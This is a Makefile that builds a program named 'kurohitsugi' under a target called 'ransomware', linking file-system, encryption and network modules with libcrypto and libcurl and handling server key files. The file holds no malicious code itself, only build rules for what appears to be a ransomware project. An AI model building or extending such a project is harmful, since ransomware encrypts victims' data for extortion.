all: ransomware
	@touch keyfile

ransomware: main.o file_system.o encryption.o network.o
	gcc main.o lib/file_system.o lib/encryption.o lib/network.o -lcrypto -lcurl -o kurohitsugi

main.o: main.c
	gcc -c main.c

file_system.o: lib/file_system.c
	gcc -c lib/file_system.c -o lib/file_system.o

encryption.o: lib/encryption.c
	gcc -c lib/encryption.c -o lib/encryption.o

network.o: lib/network.c
	gcc -c lib/network.c -o lib/network.o

clean:
	rm main.o lib/*.o kurohitsugi keyfile serverPublicKey serverPrivateKey